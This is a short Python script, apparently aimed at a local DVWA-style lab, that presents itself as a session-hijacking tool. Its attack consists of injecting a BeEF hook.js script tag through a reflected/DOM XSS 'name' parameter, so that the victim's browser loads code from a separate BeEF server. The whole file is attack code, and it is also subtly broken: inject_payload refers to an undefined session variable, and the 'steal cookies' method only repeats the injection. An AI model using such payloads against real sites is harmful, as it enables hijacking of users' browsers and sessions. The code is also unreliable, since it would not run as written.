import requests

# Class for implementing session hijacking using BeEF through XSS
class SessionHijacking:
    def __init__(self):
        self.target_url = "http://127.0.0.1:81/vulnerabilities/xss_d/"
    
    def exploit_vulnerable_XSS(self):
        payload = "<script src='http://127.0.0.1:3000/hook.js'></script>"
        self.inject_payload(payload)
    
    def inject_payload(self, payload):
        exploit_url = self.target_url + f"?name={payload}"
        s.get(exploit_url)
    
    def steal_session_cookies(self):
        payload = "<script src='http://127.0.0.1:3000/hook.js'></script>"
        self.inject_payload(payload)
    
    def main(self):
        with requests.Session() as s:
            self.exploit_vulnerable_XSS()

if __name__ == "__main__":
    hijacker = SessionHijacking()
    hijacker.main()
